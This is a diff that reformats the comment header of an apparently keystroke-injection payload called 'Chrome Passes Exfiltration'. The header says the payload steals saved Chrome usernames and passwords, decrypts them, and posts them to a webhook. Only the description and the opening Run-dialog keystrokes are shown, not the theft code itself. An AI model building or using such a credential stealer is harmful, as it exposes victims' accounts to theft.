@@ -1,13 +1,13 @@
-REM ############################################################################################################# 
-REM # Title: Chrome Passes Exfiltration                                                                         #
-REM # Description: This script appears to be attempting to retrieve saved login data from Google Chrome and     #
-send it to a specified webhook URL. The login data is decrypted using the ProtectedData class in the            #
-System.Security namespace, and the decrypted usernames and passwords are stored in an object called $data.      #
-The usernames and passwords are then sent to the webhook URL using an HTTP POST request. There are two methods  # 
-of sending the data to the webhook shown in the script - the first sends the data as a string formed by         #
-concatenating the usernames and passwords, and the second sends the data as a JSON object.                      #                                                                   
-REM # Author: B4ph0m3th                                                                                         #
-REM ############################################################################################################# 
+REM ################################################################################################################
+REM # Title: Chrome Passes Exfiltration                                                                            #
+REM # Description: This script appears to be attempting to retrieve saved login data from Google Chrome and        #
+REM send it to a specified webhook URL. The login data is decrypted using the ProtectedData class in the           #
+REM System.Security namespace, and the decrypted usernames and passwords are stored in an object called $data.     #
+REM The usernames and passwords are then sent to the webhook URL using an HTTP POST request. There are two methods # 
+REM of sending the data to the webhook shown in the script - the first sends the data as a string formed by        #
+REMconcatenating the usernames and passwords, and the second sends the data as a JSON object.                      #                                                     
+REM # Author: B4ph0m3th                                                                                            #
+REM ################################################################################################################
 REM @@ Opening the CMD
 GUI r 
 DELAY 500
